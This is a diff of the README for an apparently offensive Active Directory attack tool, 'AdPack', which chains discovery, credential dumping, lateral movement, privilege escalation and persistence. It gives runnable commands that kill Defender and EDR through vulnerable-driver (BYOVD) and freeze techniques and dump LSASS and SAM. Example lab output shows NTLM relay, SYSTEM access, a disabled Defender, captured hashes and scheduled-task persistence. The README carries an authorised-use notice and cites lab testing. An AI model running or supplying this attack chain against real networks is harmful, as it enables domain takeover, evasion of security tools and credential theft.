@@ -12,66 +12,41 @@
     <img src="https://img.shields.io/badge/Go-1.25+-black?style=for-the-badge&logo=go&logoColor=white" alt="Go">
   </a>
   <img src="https://img.shields.io/badge/Platform-Linux%20%7C%20WSL-white?style=for-the-badge&logo=linux&logoColor=black" alt="Platform">
-  <a href="https://github.com/Yenn503/AdPack/releases">
-    <img src="https://img.shields.io/badge/Version-0.3.0--dev-black?style=for-the-badge&logo=semver&logoColor=white" alt="Version">
-  </a>
-  <a href="https://app.devin.ai/org/yenn503/wiki/Yenn503/AdPack?branch=main">
-    <img src="https://img.shields.io/badge/Wiki-white?style=for-the-badge&logo=readthedocs&logoColor=black" alt="Devin Wiki">
-  </a>
+  <img src="https://img.shields.io/badge/Version-0.3.0-black?style=for-the-badge&logo=semver&logoColor=white" alt="Version">
 </p>
 
 <p align="center">
-  <a href="#-quick-start"><img src="https://img.shields.io/badge/⚡_Quick_Start-black?style=for-the-badge" alt="Quick Start"></a>
-  <a href="#-features"><img src="https://img.shields.io/badge/⚪_Features-white?style=for-the-badge" alt="Features"></a>
-  <a href="#-evasion-profiles"><img src="https://img.shields.io/badge/⚫_Evasion-black?style=for-the-badge" alt="Evasion"></a>
-  <a href="#-documentation"><img src="https://img.shields.io/badge/⚪_Docs-white?style=for-the-badge" alt="Docs"></a>
-  <a href="#-installation"><img src="https://img.shields.io/badge/⚫_Install-black?style=for-the-badge" alt="Install"></a>
+  <a href="#-quick-start"><img src="https://img.shields.io/badge/Quick_Start-black?style=for-the-badge" alt="Quick Start"></a>
+  <a href="#-features"><img src="https://img.shields.io/badge/Features-white?style=for-the-badge" alt="Features"></a>
+  <a href="#-evasion-profiles"><img src="https://img.shields.io/badge/Evasion-black?style=for-the-badge" alt="Evasion"></a>
+  <a href="#-documentation"><img src="https://img.shields.io/badge/Docs-white?style=for-the-badge" alt="Docs"></a>
+  <a href="#-installation"><img src="https://img.shields.io/badge/Install-black?style=for-the-badge" alt="Install"></a>
 </p>
 
 <br>
 
-> [!IMPORTANT]
-> **Authorised Use Only** — This tool is designed for legitimate security assessments and penetration testing with explicit written authorisation. Unauthorised access to computer systems is illegal.
+> Authorised Use Only — This tool is for legitimate security assessments and penetration testing with explicit written authorisation. Unauthorised access to computer systems is illegal.
 
 <br>
 
-## ⚫ Overview
+## Overview
 
-adpack runs AD attacks through 9 phases. Tracks hosts, users, creds, and sessions in SQLite. Detects gaps, suggests next steps, and goes from recon to domain admin.
+Adpack runs AD attacks through 9 phases. It tracks hosts, users, creds, and sessions in SQLite, detects gaps, suggests next steps, and goes from recon to domain admin.
 
-### ⚪ Capabilities
-
-- **Smart Phase Tracking** — Detects missing data and suggests what to run next
-- **13 Evasion Profiles** — Go wrappers for advanced techniques including Nightmare Eclipse methods
-- **Multi-Protocol Validation** — Tests creds across SMB, LDAP, WinRM, RDP
-- **Persistent State** — SQLite survives crashes and resumes sessions
-- **One-Command Setup** — `./setup.sh` installs core tools and creates config
-
----
-
-## Quick Start
+### Quick Start
 
 ```bash
-# Clone and install
 git clone https://github.com/Yenn503/AdPack.git
 cd adpack && ./setup.sh && source ~/.bashrc
 
-# Automated attack chain
-adpack autorun --target 10.0.0.5 --max 5
+# Automated attack chain — seed creds, execute privesc paths
+adpack autorun --target 192.168.57.22 \
+  --domain north.sevenkingdoms.local \
+  --user samwell.tarly --password Heartsbane \
+  --execute --skip-fail
 ```
 
-### Manual Workflow
-
-```bash
-adpack status                          # View current state
-adpack run discovery -t 10.0.0.5       # Discover domain controllers
-adpack run enumeration -t 10.0.0.5     # Enumerate users and computers
-adpack run credential_acq -t 10.0.0.5  # Extract credentials
-adpack validate                        # Test credentials across protocols
-adpack run lateral -t 10.0.0.6         # Lateral movement
-```
-
-**Example output (GOAD-Light, 2026-05-28):**
+### Example Output
 
 ```
   ────────────────────────────────────────────────────
@@ -79,115 +54,112 @@ adpack run lateral -t 10.0.0.6         # Lateral movement
   Target:  192.168.57.22
   ────────────────────────────────────────────────────
 
-  ────────────────────────────────────────────────────
-  [1] DISCOVERY  No hosts found. Run nmap sweep or specify targets.
-  ────────────────────────────────────────────────────
-  [+] Host added from target flag: 192.168.57.22
-  ✓  1 host(s) discovered
-    ·  192.168.57.22
+  →  Seeded creds: north.sevenkingdoms.local\samwell.tarly
 
-  ✓  complete  ·  8.782s
+  ── [1] DISCOVERY ───────────────────────────────────
+[+] Host added from target flag: 192.168.57.22
+[+] Discovered host: KINGSLANDING (192.168.57.10) [DC]
+[+] Discovered host: WINTERFELL (192.168.57.11) [DC]
+  ✓  3 host(s) discovered
 
-  ────────────────────────────────────────────────────
-  [2] ENUMERATION  Hosts=3, Users=21, Computers=4.
-  ────────────────────────────────────────────────────
+  ── [2] ENUMERATION ─────────────────────────────────
+[*] Enumerating users on 192.168.57.11 ...
+[+] Enumerated 16 users
+[+] Found 1 credential(s) in user descriptions
   ✓  16 user(s) enumerated
-  ✓  1 credential(s) found in descriptions
 
-  ✓  complete  ·  1.072s
+  ── [3] CREDENTIAL_ACQ ──────────────────────────────
+[*] AS-REP: 1 roastable users found
+[*] Kerberoast: 9 SPN accounts found
 
-  ... (phases 3-7: credential_acq, session_harvest,
-       graph_analysis, lateral, validation) ...
+  ── [6] GRAPH_ANALYSIS ──────────────────────────────
+[+] 2 computers, 3 GPOs, 33 ADCS templates
 
-  ────────────────────────────────────────────────────
-  [8] PRIVESC  Check ACL abuse, ADCS, RBCD, GPP.
-  ────────────────────────────────────────────────────
-  ✓  Responder started on eth0 (LLMNR/NBT-NS/WPAD poisoning)
-  ✓  NTLM relay started on 0.0.0.0 → ldap://192.168.57.22
-  ✓  ESC8 relay started → http://192.168.57.22/certsrv/certfnsh.asp
-  ▸  Checking GPP passwords in SYSVOL...
-  ▸  Checking ADCS vulnerable templates...
-  ▸  Enumerating ACL privilege edges (daclread)...
-  ✓  1 MSSQL privilege edge(s) found
-    samwell.tarly → MSSQL_XP_CMDSHELL → SYSTEM@192.168.57.22
-  ✓  33 ADCS template(s) found (ESC1, ESC8, ESC13)
-  ✓  1 delegation edge(s) found
+  ── [7] LATERAL ─────────────────────────────────────
+  ✓  SMB-WMI succeeded   ✓  SMB-PSExec succeeded
+  ✓  WinRM succeeded     ✓  MSSQL-xpcmd succeeded
+
+  ── [9] PRIVESC ─────────────────────────────────────
+  ✓  Responder started (LLMNR/NBT-NS/WPAD poisoning)
+  ✓  NTLM relay started → ldap://192.168.57.22
   ✓  BloodHound merged: 21 users, 51 groups, 4 computers
-
-  [+] SYSTEM access confirmed on 192.168.57.22 (smbexec)
-  ✓  SAM dump: Administrator, WDAGUtilityAccount, vagrant
-  ✓  LSA dump: robb.stark DCC2, CASTELBLACK$ machine hash
-  ▸  Deploying UnDefend.exe --kill to disable Defender...
+  ✓  SYSTEM confirmed on CASTELBLACK (MSSQL XMP_CMDSHELL)
   ✓  UnDefend --kill executed (Defender disabled)
-  ▸  Deep credential dump (post-evasion)...
-  →  No additional creds from deep dump (SAM/LSA already captured)
+  ✓  3 credentials from SAM dump
 
-  ✓  complete  ·  33.6s
+  ── [12] PERSISTENCE ────────────────────────────────
+[+] Scheduled task persistence created (onlogon, SYSTEM)
 
-  ────────────────────────────────────────────────────
-  [9] PERSISTENCE  Establish persistence.
-  ────────────────────────────────────────────────────
-  ✓  Scheduled task created (onlogon, SYSTEM)
-  ✓  Persistence mechanisms deployed
+  ✓  All phases complete or blocked. Review state.
+  ■  12 phases  ·  3 hosts  ·  21 users  ·  5 creds (4 validated)
 
-  ✓  complete  ·  1.6s
-
-  ■  9 phases  ·  3 hosts  ·  21 users  ·  5 creds (4 validated)
-
-  ────────────────────────────────────────────────────────
-  LOOT SUMMARY
-  ────────────────────────────────────────────────────────
   CREDENTIALS  (5 total, 4 validated)
-    ·  north\samwell.tarly  Heartsbane  ✓
-    ·  north\Administrator  dbd13e1c...  ✓
-    ·  north\vagrant  e02bc503...  ✓
-    ·  north\WDAGUtilityAccount  9ab6e30...  ✓
-    ·  north\brandon.stark  $krb5asrep$...  ?
+    ·  north.sevenkingdoms.local\samwell.tarly  Heartsbane  ✓
+    ·  north.sevenkingdoms.local\Administrator  dbd13e1c4...  ✓
+    ·  north.sevenkingdoms.local\vagrant       e02bc5033...  ✓
 
-  VULNERABILITY COVERAGE
-    ●  SYSTEM Access  [1 hosts]
-    ●  Domain Admin  [1 creds]
-    ●  xp_cmdshell  [1 edges]
-    ●  ESC1  [1 edges]
-    ●  ESC8  [33 templates]
-    ●  Unconstrained Delegation  [1 edges]
-    ●  Dangerous ACLs  [299 edges]
-    ●  Backdoors  Deployed
+  HOSTS  (3 total)
+    ·  192.168.57.22  CASTELBLACK [COMPROMISED]
+    ·  192.168.57.10  KINGSLANDING [DC]
+    ·  192.168.57.11  WINTERFELL [DC]
+
+  PRIVILEGE EDGES  (473 total)
+    ·  GenericAll x133 ·  GenericWrite x81 ·  WriteDacl x83
+    ·  ADCS_ESC1 x1 ·  ADCS_ESC13 x2 ·  UNCONSTRAINED_DELEGATION x1
+    ·  MSSQL_XP_CMDSHELL x1 ·  MSSQL_LINKED_SERVER x1
+    ·  MemberOf x37 ·  AdminTo x10 ·  AddKeyCredentialLink x12
 ```
 
+### Manual Workflow
+
+```bash
+adpack status                          # View current state and gaps
+adpack run discovery -t 10.0.0.5       # Find domain controllers
+adpack run enumeration -t 10.0.0.5     # Enumerate users and computers
+adpack run credential_acq -t 10.0.0.5  # Extract credentials
+adpack validate                        # Test creds across protocols
+adpack run lateral -t 10.0.0.6         # Lateral movement
+```
+
+See [USAGE.md](docs/USAGE.md) for the full command reference.
 
 ---
 
-## ⚪ Features
+## Features
 
-### Intel & Orchestration
-- Tracks state and detects missing data
-- Scores evidence quality
-- Skips phases when DA creds found
-- TUI dashboard and JSON export
+### Orchestration
+- Tracks state across phases, detects missing prerequisites
+- Auto-run mode chains phases together with depth limits
+- Resume partially-completed phases with `--resume`
+- Dry-run mode with `--dry-run` to preview before executing
+- Scope enforcement via CIDR whitelist in config
+- Colour-coded CLI output with Lipgloss styling
+- TUI dashboard via `adpack interactive`
 
 ### Credential Operations
-- Cascading deep credential dump: go-mimikatz → nanodump+pypykatz → nxc SAM/LSA (graceful degradation)
-- Automatic AV evasion: UnDefend --kill deploys post-SYSTEM, no profile flag needed
+- Cascading credential dump: go-mimikatz → nanodump+pypykatz → nxc SAM/LSA (graceful degradation)
+- Automatic AV kill: UnDefend --kill deploys post-SYSTEM
 - Kerberoasting and AS-REP roasting with automatic hash capture
-- Multi-protocol validation (SMB, LDAP, WinRM, RDP) — skips hash-only creds
-- Detects admin rights and checks if lateral movement works
+- Hash cracking pipeline via hashcat (NTLM, krb5tgs, krb5asrep)
+- Multi-protocol validation across SMB, LDAP, WinRM, RDP
+- Detects admin rights and lateral movement viability
 
-### Evasion 
-- 13 profiles from basic to advanced techniques
-- Automatic AV kill via UnDefend --kill (aggressive mode) after SYSTEM access
-- BYOVD kernel access (PhantomKiller) and EDR freezing (ColdWer) workflows
-- In-memory execution via Donut and BOF integration
+### Evasion
+- 3 evasion profiles from basic to kernel-level techniques
+- Automatic AV kill after SYSTEM access
+- PPLShade kernel bypass, EDR-Freeze, and PhantomKiller BYOVD
+- In-memory execution via Donut
+- See the [evasion profiles table](#evasion-profiles) below
 
-### Automation
-- Auto-run with depth limit
-- BloodHound integration
-- Evidence tracking with timestamps
-- Colour-coded CLI output
+### Transport Interface
+Commands execute through a pluggable `Transport` interface supporting SMB, WinRM, and WMI exec methods with automatic failover. The default `local` transport uses the operator's own network position; custom transports can be swapped in for C2 relay or proxied access.
+
+### Cracking Pipeline
+Extracted hashes (NTLM, Kerberoast, AS-REP) are automatically enqueued into a background hashcat worker pool. Cracked credentials materialise into the state database and trigger re-evaluation of privesc paths.
 
 ---
 
-## ⚫ Attack Phases
+## Attack Phases
 
 9 phases from recon to persistence:
 
@@ -227,81 +199,83 @@ adpack run lateral -t 10.0.0.6         # Lateral movement
 
 ---
 
-## ⚪ Evasion Profiles
+## Evasion Profiles
 
-13 profiles orchestrating techniques from basic to advanced:
+3 profiles covering the delivery strategies that matter on real engagements:
 
-| Profile | Technique | Detection Risk | Use Case |
-|---------|-----------|:--------------:|----------|
-| `minimal` | Donut + go-mimikatz | 🟡 Medium | Lab environments |
-| `standard` | Donut + go-mimikatz (remote) | 🟡 Medium | Enterprise with Defender |
-| `aggressive` | Full evasion stack (syscalls, PPID spoof, sleep mask) | 🟢 Low | Mature EDR environments |
-| `bypass` | Aggressive stack + Defender neutralisation pre-flight | 🟢 Low | Full chain with AV kill |
-| `bof` | BOF injection (standalone) | 🟢 Low | In-memory execution |
-| `fork` | nanodump --fork | 🟢 Low | LSASS process cloning |
-| `byovd` | RTCore64.sys | 🟢 Very Low | Kernel-level PPL bypass |
-| `coldwer` | EDR-Freeze | 🟢 Very Low | EDR blind spot |
-| `undefend` | UnDefend --kill (automatic post-SYSTEM) | 🟢 Low | Defender termination + LSASS dump |
-| `bluehammer` | CVE-2026-33825 | 🟢 Very Low | Unprivileged SAM dump (requires Windows VS 2022 build) |
-| `phantomkiller` | BootRepair.sys BYOVD | 🟢 Very Low | PPL-protected EDR kill |
-| `miniplasma` | Cloud Filter EoP (CVE-2020-17103) | 🟢 Very Low | Kernel-adjacent SYSTEM path, independent of service/task primitives |
-| `custom` | User-defined pipeline | 🟡 Medium | Custom configurations |
+| Profile | Technique | Use Case |
+|---------|-----------|----------|
+| `standard` | Donut + go-mimikatz (remote exec) | Enterprise with Defender — AMSI/ETW patching, remote execution |
+| `bypass` | Standard profile + UnDefend pre-flight | Full chain with automatic Defender neutralisation before dump |
+| `custom` | User-defined pipeline | Custom configurations |
 
-### ⚫ Tool Provenance
+### Tool Provenance
 
-Tools are acquired through three distinct methods depending on their build ecosystem:
+| Tool | Source |
+|------|--------|
+| go-mimikatz | Go binary, requires Windows build |
+| nanodump | Cross-compiled Go, downloaded during setup |
+| UnDefend | Cross-compiled via MinGW during setup |
 
-| Tier | Method | Tools |
-|------|--------|-------|
-| **Cross-compiled** | Built from source during setup via MinGW | UnDefend |
-| **Release binary** | Downloaded as pre-built artifact from GitHub | PhantomKiller, MiniPlasma |
-| **Windows-native** | Requires Visual Studio 2022 on Windows; not buildable from Linux | BlueHammer |
+### Pre-conditions
 
-Setup is best-effort — availability is environment-dependent.
-
-### ⚫ Evasion & Post-Exploitation (Recent 2026 AV/EDR methods)
-
-Orchestrates techniques from the **Nightmare Eclipse leaks** (disclosed Q1 2026). Requires tool binaries:
-
-#### ⚡ BlueHammer (CVE-2026-33825)
-Defender RPC bug. Dumps SAM without admin rights via VSS snapshots. No LSASS alerts. Deploys FunnyApp.exe. **Build blocked cross-platform** — requires Visual Studio 2022 on Windows (MSVC, RPC IDL, Windows SDK). No pre-built binary available.
-
-#### ⚡ UnDefend
-Kills Defender via service dependency exploit. Bypasses tamper protection. Deploys UnDefend.exe. Cross-compiled from source during setup.
-
-#### ⚡ MiniPlasma
-Cloud Filter API race (CVE-2020-17103). Spawns SYSTEM shell via WER task + named pipe. Independent SYSTEM primitive — uses a kernel-adjacent race path rather than service/task creation, so it works when those control-plane primitives are hardened or monitored. Deploys MiniPlasma.exe.
-
-#### ⚡ ColdWer
-WerFaultSecure PPL bypass. Freezes EDR processes during dump. EDR can't see it. Deploys EDR-Freeze.exe.
-
-#### ⚡ PhantomKiller
-Lenovo BootRepair.sys BYOVD. IOCTL 0x222014 terminates any process, including PPL-protected EDR using a signed driver. Deploys PhantomKiller.exe + PhantomKiller.sys. Pre-built binary downloaded from GitHub release during setup.
-
-**Legal & Ethical Notice:** Use of BYOVD (Bring Your Own Vulnerable Driver) techniques and exploitation tools must only be performed on systems you are explicitly authorized to test. Verify the provenance and legality of all tools before use. Unauthorized access to computer systems is illegal.
+- **UnDefend** — Kills Defender via service dependency exploit before dumping LSASS. Triggered by the `bypass` profile automatically.
 
 **Example:**
 
 ```bash
 adpack run credential_acq -e standard -t 10.0.0.5          # Standard LSASS dump
-adpack run credential_acq -e coldwer -t 10.0.0.5           # Freeze EDR + dump
-adpack run credential_acq -e phantomkiller -t 10.0.0.5     # BYOVD EDR kill + dump
-adpack run credential_acq -e miniplasma -t 10.0.0.5        # SYSTEM shell (cloud filter race path) + LSASS
+adpack run credential_acq -e bypass -t 10.0.0.5            # Kill Defender + dump
 adpack validate                                             # Validate creds
 adpack run lateral -t 10.0.0.6                             # Lateral movement
 ```
 
 ---
 
-## ⚫ Environment
+## Environment
 
-**Build environment**: Windows + WSL2 (Ubuntu). Go builds, MinGW cross-compilation, and all Linux tooling run from WSL2, with Visual Studio 2022 on the Windows side for the one tool that needs MSVC (BlueHammer).
+Build environment: Windows + WSL2 (Ubuntu). Go builds, MinGW cross-compilation, and all Linux tooling run from WSL2.
 
-**Deployment**: adpack is a single Go binary — compile once and deploy to any Linux host (Kali, C2 server, attack VM). Pre-built Windows tool binaries (PhantomKiller, MiniPlasma, UnDefend) are copied alongside; no WSL2 or Windows dependency at runtime.
+Deployment: adpack is a single Go binary — compile once and deploy to any Linux host (Kali, C2 server, attack VM). Pre-built Windows tool binaries are copied alongside.
 
-Tested on **DreadGOAD-Light** (3 VMware VMs, 2 forests) running locally.
+Tested on DreadGOAD-Light (3 VMware VMs, 2 forests) and VulnAD (Docker).
 
-## ⚫ Installation
+---
+
+## Configuration
+
+Create `~/.adpack/config.yaml` (or use setup.sh generated config):
+
+```yaml
+db_path: ""
+nmap_args: ["-T4", "-sn"]
+nxc_path: "netexec"
+bh_python: "bloodhound-python"
+
+cracking:
+  hashcat_path: "/usr/bin/hashcat"
+  wordlist: "/usr/share/wordlists/rockyou.txt"
+  rules: ["/usr/share/hashcat/rules/best64.rule"]
+  timeout_seconds: 600
+
+viper:
+  enabled: false
+  host: "localhost"
+  port: 7687
+
+# Target scope: CIDR ranges allowed for attacks (optional safety net)
+# scope:
+#   - "10.0.0.0/8"
+#   - "192.168.1.0/24"
+```
+
+Credentials are encrypted at rest using AES-GCM in the SQLite database. The encryption key is stored alongside the database file. Protect both with 600 permissions and disk encryption.
+
+See [config.example.yaml](config.example.yaml) for the full reference.
+
+---
+
+## Installation
 
 ### Automated Setup
 
@@ -312,104 +286,30 @@ cd adpack
 source ~/.bashrc
 ```
 
-<table>
-<tr>
-<td><strong>Installs</strong></td>
-<td>Go 1.25+, NetExec, Donut, pypykatz, nanodump, adpack binary, default config. Clones and builds evasion tool binaries (UnDefend, PhantomKiller, MiniPlasma) where build toolchains are available. go-mimikatz requires Windows build (falls back to nanodump+pypykatz automatically).</td>
-</tr>
-<tr>
-<td><strong>Time</strong></td>
-<td>~5-10 minutes</td>
-</tr>
-<tr>
-<td><strong>Note</strong></td>
-<td>Some tools cross-compiled from source; BlueHammer requires Windows VS 2022 build. See SETUP.md.</td>
-</tr>
-</table>
+Installs Go 1.25+, NetExec, Donut, pypykatz, nanodump, adpack binary, default config. Clones and builds evasion tool binaries where possible. ~5-10 minutes.
 
-### ⚪ Manual Installation
+### Manual Installation
 
-See [SETUP.md](SETUP.md) for manual install.
+See [docs/SETUP.md](docs/SETUP.md).
 
 ---
 
-## ⚫ Configuration
+## Documentation
 
-Create `~/.adpack/config.yaml` (or use setup.sh generated config):
-
-```yaml
-db_path: "~/.adpack/state.db"
-
-nxc_path: "netexec"
-bh_python: "bloodhound-python"
-
-viper:
-  enabled: false
-  host: "localhost"
-  port: 7687
-```
-
-**Note**: Credentials are encrypted at rest using AES-GCM in the SQLite database. Encryption keys are persisted as per-database random 32-byte keys stored in corresponding `.key` files (e.g., `~/.adpack/state.db.key`). Protect both `~/.adpack/state.db` and its `.key` file with appropriate file permissions (600), use disk encryption for sensitive engagements, and ensure both files are stored securely.
+| Doc | Description |
+|-----|-------------|
+| [USAGE.md](docs/USAGE.md) | Complete command reference, workflows, and examples |
+| [SETUP.md](docs/SETUP.md) | Installation guide and environment setup |
+| [CONTEXT.md](docs/CONTEXT.md) | Domain language, architecture, and design decisions |
+| [CONTRIBUTING.md](docs/CONTRIBUTING.md) | Development guidelines and contribution process |
+| [CHANGELOG.md](docs/CHANGELOG.md) | Release history |
 
 ---
 
-## ⚪ Testing Environments
+## License
 
-All 9 phases — discovery, enumeration, credential_acq, session_harvest, graph_analysis, lateral, validation, privesc, persistence — have been run and verified end-to-end on these labs:
+MIT License — see [LICENSE](LICENSE)
 
-| Lab | Source | Environment |
-|-----|--------|-------------|
-| **DreadGOAD-Light** | [dreadnode/DreadGOAD](https://github.com/dreadnode/DreadGOAD) | 3 VMware VMs, 2 forests, 7kingdoms.local + north.sevenkingdoms.local |
-| **VulnAD** | [OctoRig](https://github.com/CommonHuman-Lab/OctoRig) | Single Docker container, vulnad.local |
+## Contributing
 
----
-
-## ⚫ Documentation
-
-<table>
-<tr>
-<td width="25%"><a href="USAGE.md"><strong>USAGE.md</strong></a></td>
-<td>Complete command reference, workflows, and examples</td>
-</tr>
-<tr>
-<td><a href="SETUP.md"><strong>SETUP.md</strong></a></td>
-<td>Installation guide and environment setup</td>
-</tr>
-<tr>
-<td><a href="CONTEXT.md"><strong>CONTEXT.md</strong></a></td>
-<td>Domain language, architecture, and design decisions</td>
-</tr>
-<tr>
-<td><a href="CONTRIBUTING.md"><strong>CONTRIBUTING.md</strong></a></td>
-<td>Development guidelines and contribution process</td>
-</tr>
-</table>
-
----
-
-<div align="center">
-
-## ⚪ License
-
-MIT License - see [LICENSE](LICENSE)
-
-## ⚫ Contributing
-
-PRs welcome. Read [CONTRIBUTING.md](CONTRIBUTING.md) first.
-
----
-
-<img src="https://img.shields.io/badge/AdPack-v0.3.0--dev-black?style=for-the-badge&logo=github&logoColor=white" alt="AdPack">
-
-<br>
-
-<a href="https://github.com/Yenn503/AdPack/issues"><img src="https://img.shields.io/badge/⚫_Report_Bug-white?style=for-the-badge" alt="Report Bug"></a>
-<a href="https://github.com/Yenn503/AdPack/issues"><img src="https://img.shields.io/badge/⚪_Request_Feature-black?style=for-the-badge" alt="Feature"></a>
-<a href="USAGE.md"><img src="https://img.shields.io/badge/⚫_Documentation-white?style=for-the-badge" alt="Docs"></a>
-
-<br>
-<br>
-
-<sub>Made by JYenn</sub>
-
-</div>
+PRs welcome. Read [CONTRIBUTING.md](docs/CONTRIBUTING.md) first.
